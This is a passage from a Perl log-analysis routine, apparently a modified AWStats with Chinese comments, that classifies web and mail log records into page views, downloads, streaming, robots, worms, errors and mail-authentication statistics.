		#---------------------------------------------------------------------------
		# Convert $field[$pos_size]
		# if ($field[$pos_size] eq '-') { $field[$pos_size]=0; }

		# Define a clean target URL and referrer URL
		# We keep a clean $field[$pos_url] and
		# we store original value for urlwithnoquery, tokenquery and standalonequery
		#---------------------------------------------------------------------------

		# Decode "unreserved characters" - URIs with common ASCII characters
		# percent-encoded are equivalent to their unencoded versions.
		#
		# See section 2.3. of RFC 3986.

		$field[$pos_url] = DecodeRFC3986UnreservedString($field[$pos_url]);

		if ($URLNotCaseSensitive) { $field[$pos_url] = lc( $field[$pos_url] ); }

		# Possible URL syntax for $field[$pos_url]: /mydir/mypage.ext?param1=x&param2=y#aaa, /mydir/mypage.ext#aaa, /
		my $urlwithnoquery;
		my $tokenquery;
		my $standalonequery;
		my $anchor = '';
		if ( $field[$pos_url] =~ s/$regtruncanchor//o ) {
			$anchor = $1;
		}    # Remove and save anchor
		if ($URLWithQuery) {
			$urlwithnoquery = $field[$pos_url];
			my $foundparam = ( $urlwithnoquery =~ s/$regtruncurl//o );
			$tokenquery      = $1 || '';
			$standalonequery = $2 || '';

			# For IIS setup, if pos_query is enabled we need to combine the URL to query strings
			if (   !$foundparam
				&& $pos_query >= 0
				&& $field[$pos_query]
				&& $field[$pos_query] ne '-' )
			{
				$foundparam      = 1;
				$tokenquery      = '?';
				$standalonequery = $field[$pos_query];

				# Define query
				$field[$pos_url] .= '?' . $field[$pos_query];
			}
			if ($foundparam) {

  				# Keep only params that are defined in URLWithQueryWithOnlyFollowingParameters
				my $newstandalonequery = '';
				if (@URLWithQueryWithOnly) {
					foreach (@URLWithQueryWithOnly) {
						foreach my $p ( split( /&/, $standalonequery ) ) {
							if ($URLNotCaseSensitive) {
								if ( $p =~ /^$_=/i ) {
									$newstandalonequery .= "$p&";
									last;
								}
							}
							else {
								if ( $p =~ /^$_=/ ) {
									$newstandalonequery .= "$p&";
									last;
								}
							}
						}
					}
					chop $newstandalonequery;
				}

				# Remove params that are marked to be ignored in URLWithQueryWithoutFollowingParameters
				elsif (@URLWithQueryWithout) {
					foreach my $p ( split( /&/, $standalonequery ) ) {
						my $found = 0;
						foreach (@URLWithQueryWithout) {

							#if ($Debug) { debug("  Check if '$_=' is param '$p' to remove it from query",5); }
							if ($URLNotCaseSensitive) {
								if ( $p =~ /^$_=/i ) { $found = 1; last; }
							}
							else {
								if ( $p =~ /^$_=/ ) { $found = 1; last; }
							}
						}
						if ( !$found ) { $newstandalonequery .= "$p&"; }
					}
					chop $newstandalonequery;
				}
				else { $newstandalonequery = $standalonequery; }

				# Define query
				$field[$pos_url] = $urlwithnoquery;
				if ($newstandalonequery) {
					$field[$pos_url] .= "$tokenquery$newstandalonequery";
				}
			}
		}
		else {

			# Trunc parameters of URL
			$field[$pos_url] =~ s/$regtruncurl//o;
			$urlwithnoquery  = $field[$pos_url];
			$tokenquery      = $1 || '';
			$standalonequery = $2 || '';

			# For IIS setup, if pos_query is enabled we need to use it for query strings
			if (   $pos_query >= 0
				&& $field[$pos_query]
				&& $field[$pos_query] ne '-' )
			{
				$tokenquery      = '?';
				$standalonequery = $field[$pos_query];
			}
		}
		if ( $URLWithAnchor && $anchor ) {
			$field[$pos_url] .= "#$anchor";
		}   # Restore anchor
			# Here now urlwithnoquery is /mydir/mypage.ext, /mydir, /, /page#XXX
			# Here now tokenquery is '' or '?' or ';'
			# Here now standalonequery is '' or 'param1=x'

		# Define page and extension
		#--------------------------
		my $PageBool = 1;

		# Extension
		my $extension = Get_Extension($regext, $urlwithnoquery);
		if ( $NotPageList{$extension} || 
		($MimeHashLib{$extension}[1]) && $MimeHashLib{$extension}[1] ne 'p') { $PageBool = 0;}
		if ( @NotPageFiles && &NotPageFile( $field[$pos_url] ) ) { $PageBool = 0; }

		# Analyze: successful favicon (=> countedtraffic=1 if favicon)
		#--------------------------------------------------
		if ( $urlwithnoquery =~ /$regicons/o ) {
			# 提取图标类型
			my $icon_type = 'other';
			
			# Favicon
			if ( $urlwithnoquery =~ /\/favicon(?:\.[a-z]+|\-\d+x\d+\.png|\.ico|\.svg)$/i ) {
				$icon_type = 'favicon';
			}
			# Apple Touch Icon
			elsif ( $urlwithnoquery =~ /\/apple-touch-icon(?:-\d+x\d+)?\.png$/i ) {
				$icon_type = 'apple_touch';
			}
			# Web App Manifest
			elsif ( $urlwithnoquery =~ /manifest\.(json|webmanifest)/i ) {
				$icon_type = 'webmanifest';
			}
			# Safari Pinned Tab
			elsif ( $urlwithnoquery =~ /\/safari-pinned-tab\.svg$/i ) {
				$icon_type = 'safari_pinned';
			}
			# Social Icons
			elsif ( $urlwithnoquery =~ /\/(github|paypal|twitter|facebook|linkedin|wechat|weibo)\.svg$/i ) {
				$icon_type = 'social_icon';
			}
			# Site Logo
			elsif ( $urlwithnoquery =~ /\/logo\.(?:svg|png|jpg|jpeg|webp)$/i ) {
				$icon_type = 'logo';
			}
			# Windows Browser Config
			elsif ( $urlwithnoquery =~ /\/browserconfig\.xml$/i ) {
				$icon_type = 'browserconfig';
			}
			# 原有简单匹配（保持兼容）
			elsif ( $urlwithnoquery =~ /favicon/i ) {
				$icon_type = 'favicon';
			}
			elsif ( $urlwithnoquery =~ /apple-touch/i ) {
				$icon_type = 'apple_touch';
			}
			elsif ( $urlwithnoquery =~ /logo/i ) {
				$icon_type = 'logo';
			}
			
			# 统计状态码
			my $code = $field[$pos_code];
			if ( $code == 200 || $code == 304 ) {
				$_icon_status{$icon_type}{'200'}++;
			}
			elsif ( $code == 404 ) {
				$_icon_status{$icon_type}{'404'}++;
				if ($Debug) {
					debug("Missing icon: $urlwithnoquery", 2);
				}
			}
			else {
				$_icon_status{$icon_type}{'other'}++;
			}
			
			# 原有的 favicon 逻辑
			if ( $urlwithnoquery =~ /$regfavico/o ) {
				$countedtraffic = 1;
				$_time_nv_h[$hourrecord]++;
				if ( $field[$pos_code] != 404 && $pos_size > 0 ) {
					$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
				}
			}
			else {
				$countedtraffic = 7;
				if ( $field[$pos_code] != 404 && $pos_size > 0 ) {
					$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
				}
				$_time_nv_h[$hourrecord]++;
			}
		}

		# Analyze: Worms (=> countedtraffic=2 if worm)
		#---------------------------------------------
		if ( !$countedtraffic ) {
			if ($LevelForWormsDetection) {
				foreach (@WormsSearchIDOrder) {
					if ( $field[$pos_url] =~ /$_/ ) {

						# It's a worm
						my $worm = &UnCompileRegex($_);
						if ($Debug) {
							debug( " Record is a hit from a worm identified by '$worm'",
								2
							);
						}
						$worm = $WormsHashID{$worm} || 'unknown';
						$_worm_h{$worm}++;
						if ($pos_size>0){$_worm_k{$worm} += int( $field[$pos_size] );}
						$_worm_l{$worm} = $timerecord;
						$countedtraffic = 2;
						if ($PageBool) { $_time_nv_p[$hourrecord]++; }
						$_time_nv_h[$hourrecord]++;
						if ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}
						last;
					}
				}
			}
		}

		# 初始化正则表达式
		$DOWNLOAD_TOOLS_UA_RE = qr/IDM|XDM|aria2|wget|curl|python-requests|Go-http-client|WebCopier|Teleport|Scrapy|httpx/i;
		$STREAMING_UA_RE = qr/AppleWebKit|Gecko|Mobile|Android|iPhone|iPad|iPod|PlayStation|Xbox|SmartTV|HbbTV/i;
		$MOBILE_UA_RE = qr/Mobile|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone|HarmonyOS|OpenHarmony/i;
		$DYNAMIC_URL_RE = qr/\.(php|asp|jsp|do|action|cgi|pl|py|rb)\?/i;
		# Analyze: Status code (=> countedtraffic=3 if error)
		#----------------------------------------------------
		if (defined $DownloadExtList && $DownloadExtList ne '') {
			%DOWNLOAD_EXTS = map { $_ => 1 } split(/\s+/, lc($DownloadExtList));
		} else {
			# 默认下载文件扩展名
			%DOWNLOAD_EXTS = map { $_ => 1 } qw(
				zip rar 7z tar gz bz2 xz zst lz4 exe msi dmg pkg deb rpm appimage apk ipa xapk aab hap app har hsp pdf doc docx xls xlsx ppt pptx odt ods odp epub mobi azw3 fb2 cbz cbr iso img bin nrg dmg toast torrent nfo psd ai sketch csv json
			);
		}

		if (defined $StreamingExtList && $StreamingExtList ne '') {
			%STREAMING_EXTS = map { $_ => 1 } split(/\s+/, lc($StreamingExtList));
		} else {
			# 默认流媒体文件扩展名
			%STREAMING_EXTS = map { $_ => 1 } qw(
				mp4 webm mkv avi mov wmv flv m4v 3gp mp3 m4a ogg wav flac aac opus m3u8 ts
			);
		}
		if ( !$countedtraffic ) {
			if ( $LogType eq 'W' || $LogType eq 'S' ) {    # HTTP record or Stream record
				
				if ( $ValidHTTPCodes{ $field[$pos_code] } ) {
					
					# 304 状态码没有内容，大小设为 0
					if ( int($field[$pos_code]) == 304 && $pos_size > 0 ) { 
						$field[$pos_size] = 0; 
					}
					
					my $status_code = int($field[$pos_code]);
					if ( ($status_code == 200 || $status_code == 206) && $pos_size > 0 ) {
						
						my $extension = lc( Get_Extension($regext, $urlwithnoquery) );
						my $is_download = 0;
						my $skip_reason = '';
						
						# 1. 检查是否为下载文件类型
						if ( $DOWNLOAD_EXTS{$extension} ) {
							$is_download = 1;
							$skip_reason = "download extension: $extension";
						}
						elsif ( defined $MimeHashLib{$extension} && $MimeHashLib{$extension}[1] eq 'd' ) {
							$is_download = 1;
							$skip_reason = "mime type: download";
						}
						
						# 2. 排除 robots.txt
						if ( $is_download && $urlwithnoquery =~ /robots\.txt$/i ) {
							$is_download = 0;
							$skip_reason = "robots.txt excluded";
						}
						
						# 3. 排除动态 URL
						if ( $is_download && $urlwithnoquery =~ $DYNAMIC_URL_RE ) {
							$is_download = 0;
							$skip_reason = "dynamic URL excluded";
						}
						
						# 4. 流媒体特殊处理
						my $is_streaming = $STREAMING_EXTS{$extension};
						if ( $is_download && $is_streaming ) {
							
							my $range_start = -1;
							if ( $pos_range >= 0 && $field[$pos_range] ) {
								if ( $field[$pos_range] =~ /bytes=(\d+)-/ ) {
									$range_start = $1;
								}
							}
							
							my $is_browser_stream = ($status_code == 206 && $UserAgent =~ $STREAMING_UA_RE);
							my $is_full_download = ($status_code == 200 && $TRACK_STREAMING_FULL_DOWNLOAD);
							my $is_download_tool = ($UserAgent =~ $DOWNLOAD_TOOLS_UA_RE);
							
							if ($is_browser_stream) {
								$is_download = 0;
								$skip_reason = "streaming playback (browser + 206)";
								if ($Debug) { debug( " Streaming playback (not counted): '$urlwithnoquery'", 2 ); }
							}
							elsif ($is_full_download) {
								if ($Debug) { debug( " Streaming full download (counted): '$urlwithnoquery'", 2 ); }
							}
							elsif ($is_download_tool) {
								if ($Debug) { debug( " Download tool streaming (counted): '$urlwithnoquery'", 2 ); }
							}
						}
						
						# 5. 最终统计下载
						if ($is_download) {
							my $file_url = $urlwithnoquery;
							my $file_size = int($field[$pos_size]) || 0;
							
							# 移动端检测
							my $is_mobile = ($UserAgent =~ $MOBILE_UA_RE) ? 1 : 0;
							
							# 断点续传检测
							my $is_resume = 0;
							if ( $pos_range >= 0 && $field[$pos_range] ) {
								if ( $field[$pos_range] =~ /bytes=(\d+)-/ && $1 > 0 ) {
									$is_resume = 1;
								}
							}
							
							# 200 状态码：完整下载或新下载
							if ( $status_code == 200 ) {
								if ( !$is_resume ) {
									$_downloads{$file_url}->{'AWSTATS_HITS'}++;
									$_downloads{$file_url}->{'AWSTATS_NEW'}++;
									$_downloads{$file_url}->{'AWSTATS_LAST_TIME'} = $timerecord;
									$_downloads{$file_url}->{'AWSTATS_LAST_UA'} = $UserAgent;
									$_downloads{$file_url}->{'AWSTATS_MOBILE'} += $is_mobile;
									if ($Debug) { debug( " New download: '$file_url' (size: $file_size, mobile: $is_mobile)", 2 ); }
								} else {
									$_downloads{$file_url}->{'AWSTATS_RESUME_START'}++;
									if ($Debug) { debug( " Resume download: '$file_url'", 2 ); }
								}
								$_downloads{$file_url}->{'AWSTATS_SIZE'} += $file_size;
							}
							# 206 状态码：分块下载
							elsif ( $status_code == 206 ) {
								if ( $_downloads{$file_url}->{'AWSTATS_HITS'} > 0 || 
									$_downloads{$file_url}->{'AWSTATS_NEW'} > 0 ) {
									$_downloads{$file_url}->{'AWSTATS_206'}++;
									$_downloads{$file_url}->{'AWSTATS_SIZE'} += $file_size;
									$_downloads{$file_url}->{'AWSTATS_LAST_TIME'} = $timerecord;
									if ($Debug) { debug( " Download chunk (206): '$file_url' (size: $file_size)", 2 ); }
								} else {
									$_downloads{$file_url}->{'AWSTATS_ORPHAN_206'}++;
									$_downloads{$file_url}->{'AWSTATS_SIZE'} += $file_size;
									if ($Debug) { debug( " Orphan 206 chunk: '$file_url'", 2 ); }
								}
								
								# 206 分块请求也需要计入带宽统计
								if ($pos_size > 0) {
									$DayBytes{$yearmonthdayrecord} += $file_size;
									$_time_k[$hourrecord] += $file_size;
								}
								$countedtraffic = 6;  # 标记为已统计
							}
							
						} elsif ($Debug) {
							debug( " Skipped: '$urlwithnoquery' - $skip_reason", 2 );
						}
					}
					
					if ( !$countedtraffic ) {
						
						# 检查是否为页面（非静态资源）
						my $is_page = 1;
						if ( $extension && $NotPageList{$extension} ) {
							$is_page = 0;
							$PageBool = 0;
						}
						
						# 页面统计
						if ($is_page) {
							$_url_p{$urlwithnoquery}++;
							$_url_e{$urlwithnoquery}++ if ( $FirstTimeforThisHost eq "" );
							$_url_k{$urlwithnoquery} += $size;
						}
						
						# 时间统计
						if ($is_page) {
							$_time_p[$hourrecord]++;
						}
						$_time_h[$hourrecord]++;
						
						# 带宽统计
						if ($pos_size > 0) {
							$size = int($field[$pos_size]);
							$DayBytes{$yearmonthdayrecord} += $size;
							$_time_k[$hourrecord] += $size;
							if ($is_page) {
								$_url_k{$urlwithnoquery} += $size;
							}
						}
						
						# 主机统计
						my $host = $field[$pos_host] || 'unknown';
						$_host_h{$host}++;
						$_host_p{$host}++ if ($is_page);
						$_host_k{$host} += $size;
						$_host_l{$host} = $timerecord;
						
						# 如果是新会话，记录开始时间
						if ( $FirstTimeforThisHost eq "" ) {
							$_host_s{$host} = $timerecord;
							$FirstTimeforThisHost = $timerecord;
						}
						$_host_u{$host} = $urlwithnoquery;
						
						$DayVisits{$yearmonthdayrecord}++ if ( $FirstTimeforThisHost eq $timerecord );
						
						if ($Debug) {
							debug( " Normal page view: '$urlwithnoquery' (status: $status_code)", 2 );
						}
					}
					
				} else {    # Code is not valid (HTTP 错误状态码)
					
					# 确保状态码是有效的三位数
					if ( $field[$pos_code] !~ /^\d\d\d$/ ) {
						$field[$pos_code] = 999;
					}
					
					# 记录错误统计
					$_errors_h{ $field[$pos_code] }++;
					if ($pos_size > 0) {
						$_errors_k{ $field[$pos_code] } += int( $field[$pos_size] );
					}
					
					# 记录需要追踪的错误详情（如 404）
					foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
						if ( $field[$pos_code] == $code ) {
							my $newurl = substr( $field[$pos_url], 0, $MaxLengthOfStoredURL );
							$newurl =~ s/[$URLQuerySeparators].*$//;
							$_sider_h{$code}{$newurl}++;
							
							if ( $pos_referer >= 0 && $ShowHTTPErrorsPageDetail =~ /R/i ) {
								my $newreferer = $field[$pos_referer];
								if ( !$URLReferrerWithQuery ) {
									$newreferer =~ s/[$URLQuerySeparators].*$//;
								}
								$_referer_h{$code}{$newurl} = $newreferer;
							}
							
							if ( $pos_host >= 0 && $ShowHTTPErrorsPageDetail =~ /H/i ) {
								my $newhost = $field[$pos_host];
								if ( !$URLReferrerWithQuery ) {
									$newhost =~ s/[$URLQuerySeparators].*$//;
								}
								$_err_host_h{$code}{$newurl} = $newhost;
								last;
							}
						}
					}
					
					if ($Debug) {
						debug( " Record stored in status code chart (status code: $field[$pos_code])", 3 );
					}
					
					$countedtraffic = 3;
					
					# 错误请求也计入未查看流量统计
					if ($PageBool) { 
						$_time_nv_p[$hourrecord]++; 
					}
					$_time_nv_h[$hourrecord]++;
					if ($pos_size > 0) {
						$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
					}
				}
			}
			elsif ( $LogType eq 'M' ) {    # Mail record - 增强版
				foreach my $i (0 .. $#field) {
					if (defined $field[$i] && $field[$i] ne '') {
						# 如果字符串有 UTF-8 标志但包含非法字符，重新编码
						if (utf8::is_utf8($field[$i])) {
							utf8::encode($field[$i]);
							utf8::decode($field[$i]);
						}
					}
				}
				# === 1. 基础状态码统计 ===
				my $is_valid = $ValidSMTPCodes{ $field[$pos_code] };
				
				if ( !$is_valid ) {
					$_errors_h{ $field[$pos_code] }++;
					if ( $field[$pos_size] ne '-' && $pos_size>0) {
						$_errors_k{ $field[$pos_code] } += int( $field[$pos_size] );
					}
					if ($Debug) {
						debug( " Mail error: status code=$field[$pos_code]", 3 );
					}
					$countedtraffic = 3;
					if ($PageBool) { $_time_nv_p[$hourrecord]++; }
					$_time_nv_h[$hourrecord]++;
					if ( $field[$pos_size] ne '-' && $pos_size>0) {
						$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
					}
				} else {
					if ($Debug) {
						debug( " Mail sent successfully: status code=$field[$pos_code]", 3 );
					}
					# 成功发送的邮件，可以额外统计
					if ( $field[$pos_size] ne '-' && $pos_size>0) {
						$_time_k[$hourrecord] += int( $field[$pos_size] );
					}
				}
				
				# === 2. 解析邮件认证结果 (DKIM/SPF/DMARC) ===
				# 查找 Authentication-Results 字段 (通常在 extra1)
				my $auth_field_idx = -1;
				for (my $i = 0; $i < @fieldlib; $i++) {
					if ($fieldlib[$i] =~ /auth/i || $fieldlib[$i] eq 'extra1') {
						$auth_field_idx = $i;
						last;
					}
				}
				
				if ($auth_field_idx >= 0 && $field[$auth_field_idx]) {
					my $auth_results = parse_auth_results($field[$auth_field_idx]);
					
					if ($auth_results->{'dkim'}) {
						$_dkim_stats{$auth_results->{'dkim'}}++;
						if ($Debug) {
							debug(" DKIM: $auth_results->{'dkim'}", 4);
						}
					}
					
					if ($auth_results->{'spf'}) {
						$_spf_stats{$auth_results->{'spf'}}++;
						if ($Debug) {
							debug(" SPF: $auth_results->{'spf'}", 4);
						}
					}
					
					if ($auth_results->{'dmarc'}) {
						$_dmarc_stats{$auth_results->{'dmarc'}}++;
						if ($Debug) {
							debug(" DMARC: $auth_results->{'dmarc'}", 4);
						}
					}
					
					if ($auth_results->{'arc'}) {
						if ($Debug) {
							debug(" ARC: $auth_results->{'arc'}", 4);
						}
					}
				}
				
				# === 3. 解析垃圾邮件评分 ===
				my $spam_field_idx = -1;
				for (my $i = 0; $i < @fieldlib; $i++) {
					if ($fieldlib[$i] =~ /spam/i || $fieldlib[$i] eq 'extra2') {
						$spam_field_idx = $i;
						last;
					}
				}
				
				if ($spam_field_idx >= 0 && $field[$spam_field_idx]) {
					my $spam_score = parse_spam_score($field[$spam_field_idx]);
					if ($spam_score > 0) {
						if ($spam_score >= 5) {
							$_spam_high{ int($spam_score) }++;
						} else {
							$_spam_low{ int($spam_score) }++;
						}
						if ($Debug) {
							debug(" Spam score: $spam_score", 4);
						}
					}
				}
				
				# === 4. 解析 TLS 信息 ===
				my $tls_field_idx = -1;
				for (my $i = 0; $i < @fieldlib; $i++) {
					if ($fieldlib[$i] =~ /tls/i || $fieldlib[$i] eq 'extra3') {
						$tls_field_idx = $i;
						last;
					}
				}
				
				if ($tls_field_idx >= 0 && $field[$tls_field_idx]) {
					my $tls_info = parse_tls_info($field[$tls_field_idx]);
					if ($tls_info->{'version'}) {
						$_tls_version{ $tls_info->{'version'} }++;
						if ($Debug) {
							debug(" TLS version: $tls_info->{'version'}", 4);
						}
					}
					if ($tls_info->{'cipher'}) {
						$_tls_cipher{ $tls_info->{'cipher'} }++;
						if ($Debug) {
							debug(" TLS cipher: $tls_info->{'cipher'}", 4);
						}
					}
				}
				
				# === 5. 解析队列延迟 ===
				my $delay_field_idx = -1;
				for (my $i = 0; $i < @fieldlib; $i++) {
					if ($fieldlib[$i] =~ /delay/i || $fieldlib[$i] eq 'extra4') {
						$delay_field_idx = $i;
						last;
					}
				}
				
				if ($delay_field_idx >= 0 && $field[$delay_field_idx]) {
					my $delay = $field[$delay_field_idx];
					if ($delay =~ /(\d+)/) {
						my $delay_range = get_delay_range($1);
						if ($delay_range) {
							$_queue_delay{$delay_range}++;
							if ($Debug) {
								debug(" Queue delay: ${1}s ($delay_range)", 4);
							}
						}
					}
				}
				
				# === 6. 解析 MTA 类型 ===
				my $mta_field_idx = -1;
				for (my $i = 0; $i < @fieldlib; $i++) {
					if ($fieldlib[$i] =~ /mta/i || $fieldlib[$i] eq 'extra5') {
						$mta_field_idx = $i;
						last;
					}
				}
				
				if ($mta_field_idx >= 0 && $field[$mta_field_idx]) {
					my $mta = lc($field[$mta_field_idx]);
					if ($mta =~ /postfix/) {
						$_mail_mta{'postfix'}++;
					} elsif ($mta =~ /exim/) {
						$_mail_mta{'exim'}++;
					} elsif ($mta =~ /sendmail/) {
						$_mail_mta{'sendmail'}++;
					} elsif ($mta =~ /exchange/i) {
						$_mail_mta{'exchange'}++;
					} else {
						$_mail_mta{'other'}++;
					}
				}
			}
			elsif ( $LogType eq 'F' ) {    # FTP record
				# FTP 日志处理（暂不实现）
			}
		}
		# 提取 UserAgent
		#----------------------
		if ( $pos_agent >= 0 ) {
			if ($DecodeUA) {
				$field[$pos_agent] =~ s/%20/_/g;
			}
			$UserAgent = $field[$pos_agent];
			if ($UserAgent && $UserAgent eq '-') { $UserAgent = ''; }
			if ($UserAgent) {
				$UserAgent =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
			}
		}
		# Analyze: Robot from robot database (=> countedtraffic=4 if robot)
		#------------------------------------------------------------------
		if ( !$countedtraffic || $countedtraffic == 6) {
			if ($Debug) {
				print "DEBUG: Entering robot detection with countedtraffic=$countedtraffic, UA=$UserAgent\n";
			}
			if ( $pos_agent >= 0 ) {
				if ($LevelForRobotsDetection) {

					if ($UserAgent) {
						my $is_mobile_device = 0;
						if (defined &get_device_type) {
							my $device_type = get_device_type($UserAgent);
							if ($device_type eq 'mobile' || $device_type eq 'tablet') {
								$is_mobile_device = 1;
								if ($Debug) {
									debug("  Mobile device detected ($device_type), skipping robot classification", 2);
								}
							}
						}
						# 如果不是移动设备，进行机器人检测
						if (!$is_mobile_device) {
							my $uarobot = $TmpRobot{$UserAgent};
							#study $UserAgent;		Does not increase speed
							if ( !$uarobot ) {
								if ($Debug) {
									print "DEBUG: Starting robot match for UA: $UserAgent\n";
								}
								foreach my $rule (@RobotsSearchIDOrder) {
									if ($Debug) {
										print "DEBUG: Trying rule: $rule\n";
									}
									if ( $UserAgent =~ /$rule/i ) {
										if ($Debug) {
											print "DEBUG: >>> MATCHED by rule: $rule\n";
										}
										my $bot = &UnCompileRegex($rule);
										$TmpRobot{$UserAgent} = $uarobot = "$bot";
										if ($Debug) {
											debug(
												"  UserAgent '$UserAgent' is added to TmpRobot with value '$bot'",
												2
											);
										}
										last;
									}
								}
								# Last time, we won't search if robot or not. We know it's not.
								if ( !$uarobot ) {
									$TmpRobot{$UserAgent} = $uarobot = '-';
								}
							}
							if ( $uarobot ne '-' ) {
								my $is_download_file = 0;
								my $ext = lc( Get_Extension($regext, $urlwithnoquery) );
								if ( $DOWNLOAD_EXTS{$ext} ) {
									$is_download_file = 1;
								}
								if ($is_download_file) {
									if ($Debug) {
										debug( "  URL is a download file, skipping robot classification: '$urlwithnoquery' (UA: $UserAgent)", 2 );
									}
								} else {
									# If robot, we stop here
									if ($Debug) {
										debug( "  UserAgent '$UserAgent' contains robot ID '$uarobot'", 2 );
									}
									$_robot_h{$uarobot}++;
									if ( $field[$pos_size] ne '-' && $pos_size>0) {
										$_robot_k{$uarobot} += int( $field[$pos_size] );
									}
									$_robot_l{$uarobot} = $timerecord;
									if ( $urlwithnoquery =~ /$regrobot/o ) {
										$_robot_r{$uarobot}++;
									}
									$countedtraffic = 4;
									if ($PageBool) { $_time_nv_p[$hourrecord]++; }
									$_time_nv_h[$hourrecord]++;
									if ( $field[$pos_size] ne '-' && $pos_size>0) {
										$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
									}
								}
							}
						} else {
							# 移动设备：跳过机器人检测，让正常流量统计处理
							if ($Debug) {
								debug("  Mobile device, not classifying as robot, will be processed as normal traffic", 2);
							}
						}
					}
					else {
						my $uarobot = 'no_user_agent';

						# It's a robot or at least a bad browser, we stop here
						if ($Debug) {
							debug( "  UserAgent not defined so it should be a robot, saved as robot 'no_user_agent'",
								2
							);
						}
						$_robot_h{$uarobot}++;
						if ($pos_size>0){$_robot_k{$uarobot} += int( $field[$pos_size] );}
						$_robot_l{$uarobot} = $timerecord;
						if ( $urlwithnoquery =~ /$regrobot/o ) {
							$_robot_r{$uarobot}++;
						}
						$countedtraffic = 4;
						if ($PageBool) { $_time_nv_p[$hourrecord]++; }
						$_time_nv_h[$hourrecord]++;
						if ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}
					}
				}
			}
		}

		# Analyze: Robot from "hit on robots.txt" file (=> countedtraffic=5 if robot)
		# -------------------------------------------------------------------------
		if ( !$countedtraffic ) {
			if ( $urlwithnoquery =~ /$regrobot/o ) {
				# 检查当前 URL 是否为下载文件
				my $is_download_file = 0;
				my $ext = lc( Get_Extension($regext, $urlwithnoquery) );
				if ( $DOWNLOAD_EXTS{$ext} ) {
					$is_download_file = 1;
				}
				
				# 如果是下载文件，不标记为机器人，让它进入下载统计
				if ($is_download_file) {
					if ($Debug) { 
						debug( "  robots.txt hit but URL is download file, skipping robot classification: '$urlwithnoquery'", 2 ); 
					}
					# 不设置 $countedtraffic，让后续下载统计代码处理
				} else {
					if ($Debug) { debug( "  It's an unknown robot", 2 ); }
					$_robot_h{'unknown'}++;
					if ($pos_size>0){$_robot_k{'unknown'} += int( $field[$pos_size] );}
					$_robot_l{'unknown'} = $timerecord;
					$_robot_r{'unknown'}++;
					$countedtraffic = 5;    # Must not be counted somewhere else
					if ($PageBool) { $_time_nv_p[$hourrecord]++; }
					$_time_nv_h[$hourrecord]++;
					if ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}
				}
			}
		}

		# Analyze: File type - Compression
		#---------------------------------
		if ( !$countedtraffic || $countedtraffic == 6) {
			if ($LevelForFileTypesDetection) {
				if (!$PageBool) {
				if ($countedtraffic != 6){$_filetypes_h{$extension}++;}
				if ( $field[$pos_size] ne '-' && $pos_size>0) {
					$_filetypes_k{$extension} += int( $field[$pos_size] );
				}
				# Compression
				if ( $pos_gzipin >= 0 && $field[$pos_gzipin] )
				{    # If in and out in log
					my ( $notused, $in ) = split( /:/, $field[$pos_gzipin] );
					my ( $notused1, $out, $notused2 ) =
					  split( /:/, $field[$pos_gzipout] );
					if ($out) {
						$_filetypes_gz_in{$extension}  += $in;
						$_filetypes_gz_out{$extension} += $out;
					}
				}
				elsif ( $pos_compratio >= 0
					&& ( $field[$pos_compratio] =~ /(\d+)/ ) )
				{    # Calculate in/out size from percentage
					if ( $fieldlib[$pos_compratio] eq 'gzipratio' ) {

					# with mod_gzip:    % is size (before-after)/before (low for jpg) ??????????
						$_filetypes_gz_in{$extension} +=
						  int(
							$field[$pos_size] * 100 / ( ( 100 - $1 ) || 1 ) );
					}
					else {

					   # with mod_deflate: % is size after/before (high for jpg)
						$_filetypes_gz_in{$extension} +=
						  int( $field[$pos_size] * 100 / ( $1 || 1 ) );
					}
					if ($pos_size>0){$_filetypes_gz_out{$extension} += int( $field[$pos_size] );}
				}
			}
			}
			# Analyze: Date - Hour - Pages - Hits - Kilo
			#-------------------------------------------
			if ($PageBool) {

				# Replace default page name with / only ('if' is to increase speed when only 1 value in @DefaultFile)
				if ( @DefaultFile > 1 ) {
					foreach my $elem (@DefaultFile) {
						if ( $field[$pos_url] =~ s/\/$elem$/\// ) { last; }
					}
				}
				else { $field[$pos_url] =~ s/$regdefault/\//o; }

				# FirstTime and LastTime are First and Last human visits (so changed if access to a page)
				$FirstTime{$lastprocesseddate} ||= $timerecord;
				$LastTime{$lastprocesseddate} = $timerecord;
				$DayPages{$yearmonthdayrecord}++;
				$_url_p{ $field[$pos_url] }++;   #Count accesses for page (page)
				if ( $field[$pos_size] ne '-' && $pos_size>0) {
					$_url_k{ $field[$pos_url] } += int( $field[$pos_size] );
				}
				$_time_p[$hourrecord]++;    #Count accesses for hour (page)
											# TODO Use an id for hash key of url
											# $_url_t{$_url_id}
			}
			if ($countedtraffic != 6){$_time_h[$hourrecord]++;}
 			if ($countedtraffic != 6){$DayHits{$yearmonthdayrecord}++;}    #Count accesses for hour (hit)
  			if ( $field[$pos_size] ne '-' && $pos_size>0) {
  				$_time_k[$hourrecord]          += int( $field[$pos_size] );
 				$DayBytes{$yearmonthdayrecord} += int( $field[$pos_size] );     #Count accesses for hour (kb)
  			}

			# Analyze: Login
			#---------------
			if (   $pos_logname >= 0
				&& $field[$pos_logname]
				&& $field[$pos_logname] ne '-' )
			{
				$field[$pos_logname] =~
				  s/ /_/g;    # This is to allow space in logname
				if ( $LogFormat eq '6' ) {
					$field[$pos_logname] =~ s/^\"//;
					$field[$pos_logname] =~ s/\"$//;
				}             # logname field has " with Domino 6+
				if ($AuthenticatedUsersNotCaseSensitive) {
					$field[$pos_logname] = lc( $field[$pos_logname] );
				}

				# We found an authenticated user
				if ($PageBool) {
					$_login_p{ $field[$pos_logname] }++;
				}             #Count accesses for page (page)
				if ($countedtraffic != 6){$_login_h{$field[$pos_logname]}++;}         #Count accesses for page (hit)
				if ($pos_size>0){$_login_k{ $field[$pos_logname] } +=
				  int( $field[$pos_size] );}    #Count accesses for page (kb)
				$_login_l{ $field[$pos_logname] } = $timerecord;
			}
		}
		# 记录 HTTP 协议版本
		#-------------------------------------------
		my $protocol = '';
